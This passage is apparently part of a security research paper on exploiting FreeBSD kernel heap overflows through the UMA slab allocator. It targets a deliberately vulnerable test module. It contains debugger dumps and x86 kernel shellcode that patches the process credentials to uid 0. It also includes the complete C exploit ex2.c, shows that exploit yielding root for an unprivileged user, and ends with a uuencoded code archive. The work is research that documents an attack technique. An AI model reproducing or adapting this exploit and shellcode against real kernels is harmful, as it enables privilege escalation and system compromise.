+   function pointer we have hijacked in step 5.
+
+As a first attempt at exploitation let's focus on diverting execution
+through the uz_dtor function pointer to make the instruction pointer
+execute the instructions at address 0x41424344.  Our first exploit is file
+ex1.c in the code tarball:
+
+[argp@julius ~]$ kldstat | grep bug
+ 4    1 0xc25b6000 2000     bug.ko
+[argp@julius ~]$ gcc ex1.c -o ex1
+[argp@julius ~]$ ./ex1 
+---[ free items on the 256 zone: 4
+---[ consuming 4 items from the 256 zone
+[*] bug: 0: item at 0xc243c200
+[*] bug: 1: item at 0xc2593300
+[*] bug: 2: item at 0xc2381a00
+[*] bug: 3: item at 0xc243b300
+---[ free items on the 256 zone: 30
+---[ allocating 15 evil items on the 256 zone
+---[ userland (fake uma_keg_t) = 0x28202180
+[*] bug: 4: item at 0xc25e7000
+[*] bug: 5: item at 0xc25e6e00
+[*] bug: 6: item at 0xc25e6d00
+[*] bug: 7: item at 0xc25e6c00
+[*] bug: 8: item at 0xc25e6b00
+[*] bug: 9: item at 0xc25e6a00
+[*] bug: 10: item at 0xc25e6900
+[*] bug: 11: item at 0xc25e6800
+[*] bug: 12: item at 0xc25e6700
+[*] bug: 13: item at 0xc25e6600
+[*] bug: 14: item at 0xc25e6500
+[*] bug: 15: item at 0xc25e6400
+[*] bug: 16: item at 0xc25e6300
+[*] bug: 17: item at 0xc25e6200
+[*] bug: 18: item at 0xc25e6100
+---[ deallocating the last 15 items from the 256 zone
+
+Fatal trap 12: page fault while in kernel mode
+cpuid = 0; apic id = 00
+fault virtual address   = 0x41424344
+fault code              = supervisor read, page not present
+instruction pointer     = 0x20:0x41424344
+stack pointer           = 0x28:0xcd074c14
+frame pointer           = 0x28:0xcd074c4c
+code segment            = base 0x0, limit 0xfffff, type 0x1b
+                        = DPL 0, pres 1, def32 1, gran 1
+processor eflags        = interrupt enabled, resume, IOPL = 0
+current process         = 767 (ex1)
+[thread id 767 tid 100050 ]
+Stopped at     0x41424344:      *** error reading from address 41424344 ***
+db> 
+
+// We have successfully diverted execution to the 0x41424344 address.
+// Let's explore the UMA data structures.  First, the edge item of the
+// exploited slab:
+
+db> x/x 0xc25e6e00,4
+0xc25e6e00:     0               0               0               0
+
+// By examining the uma_slab_head structure of the exploited slab we can
+// see that we have overwritten its us_keg element [2-13] with the address
+// of our userland buffer (0x28202180):
+db> x/x 0xc25e6fa8,4
+0xc25e6fa8:     28202180        c2593fa8        c25e7fac        0
+
+// We continue by examining our fake uma_keg structure that us_keg is now
+// pointing to.  The uk_zones element [2-6] of our fake uma_keg structure
+// points further down our userland buffer to the fake uma_zone structure
+// at 0x28202200.
+db> x/x 0x28202180,10
+0x28202180:     c1474880        c1474980        c0b8682c        c0bd82fa
+0x28202190:     1430000         0               4               0
+0x282021a0:     0               0               0               28202200
+0x282021b0:     c32affa0        0               c32b3fa8        0
+
+// We can now verify that the uz_dtor function pointer of the fake uma_zone
+// structure contains 0x41424344 (and that uz_keg [2-1] at 0x28202208
+// points back to our fake uma_keg):
+db> x/x 0x28202200,10
+0x28202200:     c0b867ec        c1474908        28202180        0
+0x28202210:     c147492c        0               0               0
+0x28202220:     41424344        0               0               a32
+0x28202230:     0               8d9             0               0
+
+----[ 4.1 - Kernel shellcode
+
+Since we have verified that we can divert the kernel's execution flow and
+we have a place to store the code we want executed (again, in the userland
+buffer passed as an argument to the vulnerable system call) we will now
+briefly discuss the development of kernel shellcode for FreeBSD.  There is
+no need to go into extensive details on this since previous published work
+on the subject by the "Kernel wars" authors [21] and noir [22] have
+analyzed it sufficiently.  Although noir presented OpenBSD specific kernel
+shellcode, the sysctl(3) technique of leaking the address of the process
+structure from unprivileged userland code is applicable to FreeBSD as
+well.  In our kernel shellcode we use a simpler approach to locate the
+process structure first presented in [21].
+
+We want to create a small shellcode that patches the credentials record
+for the user running the exploit.  To do that we will locate the proc
+struct for the running process, then update the ucred struct that the
+process is associated with.
+
+FreeBSD/i386 uses the segment fs in kernel-context to point to the per-cpu
+variable __pcpu[n] [23].  This structure holds information for the cpu of
+the current context like current thread among other data.  We use this
+segment to quickly get hold of the proc pointer for the currently running
+process and eventually the credentials of the owner user of the process.
+
+To easily figure out the offsets in the structs used by the kernel we get
+some help from gdb, the symbol read is just used to reference addressable
+memory:
+
+$ gdb /boot/kernel/kernel
+...
+(gdb) print /x (int)&((struct thread *)&read)->td_proc-\
+     (int)(struct thread *)&read
+$1 = 0x4
+(gdb) print /x (int)&((struct proc *)&read)->p_ucred-\
+(int)(struct proc *)&read
+$2 = 0x30
+(gdb) print /x (int)&((struct ucred *)&read)->cr_uid-\
+     (int)(struct ucred *)&read
+$3 = 0x4
+(gdb) print /x (int)&((struct ucred *)&read)->cr_ruid-\
+     (int)(struct ucred *)&read
+$4 = 0x8
+
+Knowing the offsets we can now describe our shellcode in detail:
+
+1. Get the curthread pointer by referring to the first word in the struct
+   pcpu [23]:
+        movl    %fs:0, %eax
+
+2. Extract the struct proc pointer for the associated process [24]:
+        movl    0x4(%eax), %eax
+
+3. Get hold of the process owner's identity [25] by getting the struct 
+   ucred for that particular process:
+        movl    0x30(%eax), %eax
+
+4. Patch struct ucred by writing uid=0 on both the effective user ID
+   (cr_uid) and real user ID (cr_ruid) [26]:
+        xorl    %ecx, %ecx
+        movl    %ecx, 0x4(%eax)
+        movl    %ecx, 0x8(%eax)
+
+5. Restore us_keg [2-13] for our overwritten slab metadata, we use the
+   us_keg pointer found in the next uma_slab_head as will be discussed in
+   the next subsection, 4.2:
+        movl    0x1000(%esi), %eax
+        movl    %eax, (%esi)
+        
+6. Return from our shellcode and enjoy uid=0 privileges:
+        ret
+
+----[ 4.2 - Keeping the system stable
+
+After our kernel shellcode has been executed, control is returned to the
+kernel.  Eventually the kernel will try to free an item from the zone that
+uses the slab whose uma_slab_head structure we have corrupted.  However,
+the memory regions we have used to store our fake structures have been
+unmapped when our process has completed.  Therefore, the system crashes
+when it tries to dereference the address of the fake uma_keg structure
+during a free(9) call.
+
+In order to find a way to keep the system stable after returning from the
+execution of our kernel shellcode we fire up our exploit with any kind of
+kernel shellcode, execute it, and we single step in ddb(4) (after we have
+enabled a relevant breakpoint or watchpoint of course) until we reach the
+call of the uz_dtor function pointer:
+
+[thread pid 758 tid 100047 ]
+Stopped at      uma_zfree_arg+0x2d:     calll   *%edx
+
+// Above we can see the call instruction in uma_zfree_arg() where uz_dtor
+// is used.  Let's examine the state of the registers at this point:
+db> show reg
+cs                0x20
+ds                0x28
+es                0x28
+fs                 0x8
+ss                0x28
+eax         0xc25d5e00
+ecx         0xc25d5e00
+edx         0x28202260
+ebx              0x100
+esp         0xcd068c14
+ebp         0xcd068c48
+esi         0xc25d5fa8
+edi         0x28202200
+eip         0xc09e565d  uma_zfree_arg+0x2d
+efl              0x206
+db> x/x $esi
+0xc25d5fa8:     28202180
+
+// Although we have not included the relevant output, we know (see previous
+// executions of ex1.c earlier in the paper) from the execution of our
+// exploit that we have corrupted the 0xc25d5fa8 slab.  We can see that at
+// this point the %esi register holds the address of this slab.  We can
+// also see that the us_keg element ([2-13], first word of uma_slab_head)
+// of uma_slab_head points to our userland buffer (0x28202180).  What we
+// need to do is restore the value of us_keg to point to the correct
+// uma_keg.  Since we know the UMA architecture from section 2, we only
+// need to look for the correct address of uma_keg at the next or the
+// previous slab from the one we have corrupted:
+db> x/x 0xc25d6fa8
+0xc25d6fa8:     c1474900
+
+In order to ensure kernel continuation we can perform an additional check
+by making sure that the next or the previous slab is indeed a valid one and
+its us_keg pointer is not NULL.
+
+Now we know how to dynamically restore at run time from our kernel
+shellcode the value of the corrupted us_keg to contain the address of the
+correct uma_keg structure.
+
+Putting it all together, we have below the complete exploit (file ex2.c in
+the code archive):
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/module.h>
+
+#define EVIL_SIZE           428 /* causes 256 bytes to be allocated */
+#define TARGET_SIZE         256
+#define OP_ALLOC            1
+#define OP_FREE             2
+
+#define BUF_SIZE            256
+#define LINE_SIZE           56
+
+#define ITEMS_PER_SLAB      15  /* for the 256 anonymous zone */
+
+struct argz
+{
+    char *buf;
+    u_int len;
+    int op;
+    u_int slot;
+};
+
+int     get_zfree(char *zname);
+
+u_char kernelcode[] =
+"\x64\xa1\x00\x00\x00\x00"  /* movl %fs:0, %eax */
+"\x8b\x40\x04"              /* movl 0x4(%eax), %eax */
+"\x8b\x40\x30"              /* movl 0x30(%eax), %eax */
+"\x31\xc9"                  /* xorl %ecx, %ecx */
+"\x89\x48\x04"              /* movl %ecx, 0x4(%eax) */
+"\x89\x48\x08"              /* movl %ecx, 0x8(%eax) */
+"\x8b\x86\x00\x10\x00\x00"  /* movl 0x1000(%esi), %eax */
+"\x83\xf8\x00"              /* cmpl $0x0, %eax */
+"\x74\x02"                  /* je   prev */
+"\xeb\x06"                  /* jmp  end */
+                            /* prev: */
+"\x8b\x86\x00\xf0\xff\xff"  /* movl -0x1000(%esi), %eax */
+                            /* end: */
+"\x89\x06"                  /* movl %eax, (%esi) */
+"\xc3";                     /* ret */
+
+int
+main(int argc, char *argv[])
+{
+    int sn, i, j, n;
+    char *ptr;
+    u_long *lptr;
+    struct module_stat mstat;
+    struct argz vargz;
+
+    sn = i = j = n = 0;
+
+    n = get_zfree("256");
+
+    printf("---[ free items on the %d zone: %d\n", TARGET_SIZE, n);
+
+    vargz.len = TARGET_SIZE;
+    vargz.buf = calloc(vargz.len + 1, sizeof(char));
+
+    if(vargz.buf == NULL)
+    {
+        perror("calloc");
+        exit(1);
+    }
+
+    memset(vargz.buf, 0x41, vargz.len);
+
+    mstat.version = sizeof(mstat);
+    modstat(modfind("bug"), &mstat);
+    sn = mstat.data.intval;
+    vargz.op = OP_ALLOC;
+
+    printf("---[ consuming %d items from the %d zone\n", n, TARGET_SIZE);
+
+    for(i = 0; i < n; i++)
+    {
+        vargz.slot = i;
+        syscall(sn, vargz);
+    }
+
+    n = get_zfree("256");
+    printf("---[ free items on the %d zone: %d\n", TARGET_SIZE, n);
+
+    printf("---[ allocating %d evil items on the %d zone\n",
+            ITEMS_PER_SLAB, TARGET_SIZE);
+
+    free(vargz.buf);
+    vargz.len = EVIL_SIZE;
+    vargz.buf = calloc(vargz.len, sizeof(char));
+
+    if(vargz.buf == NULL)
+    {
+        perror("calloc");
+        exit(1);
+    }
+
+    /* build the overflow buffer */
+
+    ptr = (char *)vargz.buf;
+    printf("---[ userland (fake uma_keg_t) = 0x%.8x\n", (u_int)ptr);
+
+    lptr = (u_long *)(vargz.buf + EVIL_SIZE - 4);
+
+    /* overwrite the real uma_slab_head struct */
+    *lptr++ = (u_long)ptr;  /* us_keg */
+
+    /* build the fake uma_keg struct (us_keg) */
+    lptr = (u_long *)vargz.buf;
+    *lptr++ = 0xc1474880;   /* uk_link */
+    *lptr++ = 0xc1474980;   /* uk_link */
+    *lptr++ = 0xc0b8682c;   /* uk_lock */
+    *lptr++ = 0xc0bd82fa;   /* uk_lock */
+    *lptr++ = 0x1430000;    /* uk_lock */
+    *lptr++ = 0x0;          /* uk_lock */
+    *lptr++ = 0x4;          /* uk_lock */
+    *lptr++ = 0x0;          /* uk_lock */
+    *lptr++ = 0x0;          /* uk_hash */
+    *lptr++ = 0x0;          /* uk_hash */
+    *lptr++ = 0x0;          /* uk_hash */
+    
+    ptr = (char *)(vargz.buf + 128);
+    *lptr++ = (u_long)ptr;  /* fake uk_zones */
+
+    *lptr++ = 0xc32affa0;   /* uk_part_slab */
+    *lptr++ = 0x0;          /* uk_free_slab */
+    *lptr++ = 0xc32b3fa8;   /* uk_full_slab */
+    *lptr++ = 0x0;          /* uk_recurse */
+    *lptr++ = 0x3;          /* uk_align */
+    *lptr++ = 0x1a;         /* uk_pages */
+    *lptr++ = 0xd;          /* uk_free */
+    *lptr++ = 0x100;        /* uk_size */
+    *lptr++ = 0x100;        /* uk_rsize */
+    *lptr++ = 0x0;          /* uk_maxpages */
+    *lptr++ = 0x0;          /* uk_init */
+    *lptr++ = 0x0;          /* uk_fini */
+    *lptr++ = 0xc09e3790;   /* uk_allocf */
+    *lptr++ = 0xc09e3750;   /* uk_freef */
+    *lptr++ = 0x0;          /* uk_obj */
+    *lptr++ = 0x0;          /* uk_kva */
+    *lptr++ = 0x0;          /* uk_slabzone */
+    *lptr++ = 0x10fa8;      /* uk_pgoff && uk_ppera */
+    *lptr++ = 0xf;          /* uk_ipers */
+    *lptr++ = 0x10;         /* uk_flags */
+
+    /* build the fake uma_zone struct */
+    *lptr++ = 0xc0b867ec;   /* uz_name */
+    *lptr++ = 0xc1474908;   /* uz_lock */
+
+    ptr = (char *)vargz.buf;
+    *lptr++ = (u_long)ptr;  /* uz_keg */
+
+    *lptr++ = 0x0;          /* uz_link le_next */
+    *lptr++ = 0xc147492c;   /* uz_link le_prev */
+    *lptr++ = 0x0;          /* uz_full_bucket */
+    *lptr++ = 0x0;          /* uz_free_bucket */
+    *lptr++ = 0x0;          /* uz_ctor */
+
+    ptr = (char *)(vargz.buf + 224); /* our kernel shellcode */
+    *lptr++ = (u_long)ptr;  /* uz_dtor */
+
+    *lptr++ = 0x0;          /* uz_init */
+    *lptr++ = 0x0;          /* uz_fini */
+    *lptr++ = 0xa32;
+    *lptr++ = 0x0;
+    *lptr++ = 0x8d9;
+    *lptr++ = 0x0;
+    *lptr++ = 0x0;
+    *lptr++ = 0x0;
+    *lptr++ = 0x200000;
+    *lptr++ = 0xc146b1a4;
+    *lptr++ = 0xc146b000;
+    *lptr++ = 0x39;
+    *lptr++ = 0x0;
+    *lptr++ = 0x3a;
+    *lptr++ = 0x0;          /* end of uma_zone */
+
+    memcpy(ptr, kernelcode, sizeof(kernelcode));
+
+    for(j = 0; j < ITEMS_PER_SLAB; j++, i++)
+    {
+        vargz.slot = i;
+        syscall(sn, vargz);
+    }
+
+    /* free the last allocated items to trigger exploitation */
+    printf("---[ deallocating the last %d items from the %d zone\n",
+            ITEMS_PER_SLAB, TARGET_SIZE);
+
+    vargz.op = OP_FREE;
+
+    for(j = 0; j < ITEMS_PER_SLAB; j++)
+    {
+        vargz.slot = i - j;
+        syscall(sn, vargz);
+    }
+
+    free(vargz.buf);
+    return 0;
+}
+
+int
+get_zfree(char *zname)
+{
+    u_int nsize, nlimit, nused, nfree, nreq, nfail;
+    FILE *fp = NULL;
+    char buf[BUF_SIZE];
+    char iname[LINE_SIZE];
+
+    nsize = nlimit = nused = nfree = nreq = nfail = 0;
+
+    fp = popen("/usr/bin/vmstat -z", "r");
+
+    if(fp == NULL)
+    {
+        perror("popen");
+        exit(1);
+    }
+
+    memset(buf, 0, sizeof(buf));
+    memset(iname, 0, sizeof(iname));
+
+    while(fgets(buf, sizeof(buf) - 1, fp) != NULL)
+    {
+        sscanf(buf, "%s %u, %u, %u, %u, %u, %u\n", iname, &nsize, &nlimit,
+                &nused, &nfree, &nreq, &nfail);
+
+        if(strncmp(iname, zname, strlen(zname)) == 0)
+        {
+            break;
+        }
+    }
+
+    pclose(fp);
+    return nfree;
+}
+
+Let's try it:
+
+[argp@julius ~]$ uname -r
+7.2-RELEASE
+[argp@julius ~]$ kldstat | grep bug
+ 4    1 0xc25b0000 2000     bug.ko
+[argp@julius ~]$ id
+uid=1001(argp) gid=1001(argp) groups=1001(argp)
+[argp@julius ~]$ gcc ex2.c -o ex2
+[argp@julius ~]$ ./ex2
+---[ free items on the 256 zone: 34
+---[ consuming 34 items from the 256 zone
+[*] bug: 0: item at 0xc243c800
+[*] bug: 1: item at 0xc25b3900
+[*] bug: 2: item at 0xc25b2900
+[*] bug: 3: item at 0xc25b2a00
+[*] bug: 4: item at 0xc25b3800
+[*] bug: 5: item at 0xc25b2b00
+[*] bug: 6: item at 0xc25b2300
+[*] bug: 7: item at 0xc25b2600
+[*] bug: 8: item at 0xc2598e00
+[*] bug: 9: item at 0xc25b2200
+[*] bug: 10: item at 0xc25b2000
+[*] bug: 11: item at 0xc2598c00
+[*] bug: 12: item at 0xc25b2100
+[*] bug: 13: item at 0xc25b3000
+[*] bug: 14: item at 0xc25b3b00
+[*] bug: 15: item at 0xc25b2d00
+[*] bug: 16: item at 0xc25b2c00
+[*] bug: 17: item at 0xc25b3600
+[*] bug: 18: item at 0xc243c700
+[*] bug: 19: item at 0xc25b3400
+[*] bug: 20: item at 0xc25b3a00
+[*] bug: 21: item at 0xc25b3700
+[*] bug: 22: item at 0xc243cc00
+[*] bug: 23: item at 0xc243ca00
+[*] bug: 24: item at 0xc25b3500
+[*] bug: 25: item at 0xc2597300
+[*] bug: 26: item at 0xc235d100
+[*] bug: 27: item at 0xc2597100
+[*] bug: 28: item at 0xc2597600
+[*] bug: 29: item at 0xc25b3e00
+[*] bug: 30: item at 0xc25b3c00
+[*] bug: 31: item at 0xc2597500
+[*] bug: 32: item at 0xc2598d00
+[*] bug: 33: item at 0xc25b3100
+---[ free items on the 256 zone: 45
+---[ allocating 15 evil items on the 256 zone
+---[ userland (fake uma_keg_t) = 0x28202180
+[*] bug: 34: item at 0xc25e6800
+[*] bug: 35: item at 0xc25e6700
+[*] bug: 36: item at 0xc25e6600
+[*] bug: 37: item at 0xc25e6500
+[*] bug: 38: item at 0xc25e6400
+[*] bug: 39: item at 0xc25e6300
+[*] bug: 40: item at 0xc25e6200
+[*] bug: 41: item at 0xc25e6100
+[*] bug: 42: item at 0xc25e6000
+[*] bug: 43: item at 0xc25e5e00
+[*] bug: 44: item at 0xc25e5d00
+[*] bug: 45: item at 0xc25e5c00
+[*] bug: 46: item at 0xc25e5b00
+[*] bug: 47: item at 0xc25e5a00
+[*] bug: 48: item at 0xc25e5900
+---[ deallocating the last 15 items from the 256 zone
+[argp@julius ~]$ id
+uid=0(root) gid=0(wheel) egid=1001(argp) groups=1001(argp)
+
+--[ 5 - Conclusion
+
+The exploitation technique described in this paper can be applied to
+overflows that take place on memory allocated by the FreeBSD kernel.  The
+main requirement for successful arbitrary code execution, in addition to
+having an overflow bug in the kernel, is that we should be able to make
+repeated allocations of kernel memory from userland without having the
+kernel automatically deallocate our items.  We also need to have control
+over the deallocation of these items to fully control the process.
+Obviously, the uz_dtor overwrite technique we focused on in this paper is
+only one of the alternatives to achieve code execution; the rest are left
+as an exercise for the interested hacker.
+
+argp did the research, developed the exploitation methodology, discovered
+how to keep the system stable after arbitrary code execution and wrote
+this paper.  karl provided the initial challenge, pointed argp to the
+right direction and improved the kernel shellcode subsection (4.1).
+
+argp thanks all the clever signedness.org residents for discussions on
+many very interesting topics (cmn, christer, twiz, mu-b, xz and all the
+others).  Thanks also to brat for always allowing me to break his
+machines, joy and demonmass for generally being cool.
+
+karl thanks christer for starting this whole *bsd exploit epoch, and of
+course cmn for endless discussions on how to solve problems.
+
+--[ 6 - References
+
+[1]  GCC extension for protecting applications from stack-smashing attacks
+     - http://www.trl.ibm.com/projects/security/ssp/
+
+[2]  FreeBSD 8.0-CURRENT: src/sys/kern/stack_protector.c
+     - http://fxr.watson.org/fxr/source/kern/stack_protector.c
+
+[3]  FreeBSD Kernel Developer's Manual - uma(9): zone allocator
+     - http://www.freebsd.org/cgi/
+        man.cgi?query=uma&sektion=9&manpath=FreeBSD+7.2-RELEASE
+
+[4]  FreeBSD Kernel Developer's Manual - malloc(9): kernel memory
+        management routines
+     - http://www.freebsd.org/cgi/
+        man.cgi?query=malloc&sektion=9&manpath=FreeBSD+7.2-RELEASE
+
+[5]  Jeff Bonwick, The slab allocator: An object-caching kernel memory
+        allocator
+     - http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.29.4759
+
+[6]  sgrakkyu and twiz, Attacking the core: kernel exploiting notes
+     - http://phrack.org/issues.html?issue=64&id=6&mode=txt
+
+[7]  struct uma_zone
+     - http://fxr.watson.org/fxr/source/vm/uma_int.h?v=FREEBSD72#L291
+
+[8]  struct uma_bucket
+     - http://fxr.watson.org/fxr/source/vm/uma_int.h?v=FREEBSD72#L166
+
+[9]  struct uma_cache
+     - http://fxr.watson.org/fxr/source/vm/uma_int.h?v=FREEBSD72#L175
+
+[10] struct uma_keg
+     - http://fxr.watson.org/fxr/source/vm/uma_int.h?v=FREEBSD72#L190
+
+[11] struct uma_slab
+     - http://fxr.watson.org/fxr/source/vm/uma_int.h?v=FREEBSD72#L244
+
+[12] struct uma_slab_head
+     - http://fxr.watson.org/fxr/source/vm/uma_int.h?v=FREEBSD72#L230
+
+[13] Non-offpage and offpage slab representations
+     - http://fxr.watson.org/fxr/source/vm/uma_int.h?v=FREEBSD72#L87
+
+[14] FreeBSD Kernel Interfaces Manual - kld(4): dynamic kernel linker
+        facility
+     - http://www.freebsd.org/cgi/
+        man.cgi?query=kld&sektion=4&manpath=FreeBSD+7.2-RELEASE
+
+[15] signedness.org challenge #3 - FreeBSD (6.0) kernel heap overflow
+     - http://www.signedness.org/challenges/
+
+[16] FreeBSD Kernel Interfaces Manual - ddb(4): interactive kernel debugger
+     - http://www.freebsd.org/cgi/
+        man.cgi?query=ddb&sektion=4&manpath=FreeBSD+7.2-RELEASE
+
+[17] void free(void *addr, struct malloc_type *mtp)
+     - http://fxr.watson.org/fxr/source/kern/kern_malloc.c?v=FREEBSD72#L443
+
+[18] void free(void *addr, struct malloc_type *mtp)
+     - http://fxr.watson.org/fxr/source/kern/kern_malloc.c?v=FREEBSD72#L470
+
+[19] void uma_zfree_arg(uma_zone_t zone, void *item, void *udata)
+     - http://fxr.watson.org/fxr/source/vm/uma_core.c?v=FREEBSD72#L2243
+
+[20] void uma_zfree_arg(uma_zone_t zone, void *item, void *udata)
+     - http://fxr.watson.org/fxr/source/vm/uma_core.c?v=FREEBSD72#L2251
+
+[21] Joel Eriksson, Christer Oberg, Claes Nyberg and Karl Janmar, Kernel
+        wars
+     - https://www.blackhat.com/presentations/bh-usa-07/
+        Eriksson_Oberg_Nyberg_and_Jammar/
+        Whitepaper/bh-usa-07-eriksson_oberg_nyberg_and_jammar-WP.pdf
+
+[22] noir, Smashing the kernel stack for fun and profit
+     - http://www.phrack.org/issues.html?issue=60&id=6&mode=txt
+
+[23] void init386(int first)
+     - http://fxr.watson.org/fxr/source/i386/i386/
+        machdep.c?v=FREEBSD72#L2185
+
+[24] struct thread
+     - http://fxr.watson.org/fxr/source/sys/proc.h?v=FREEBSD72#L201
+
+[25] struct proc
+     - http://fxr.watson.org/fxr/source/sys/proc.h?v=FREEBSD72#L489
+
+[26] struct ucred
+     - http://fxr.watson.org/fxr/source/sys/ucred.h?v=FREEBSD72#L38
+
+--[ 7 - Code
+
+begin 644 code.tar.gz
+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
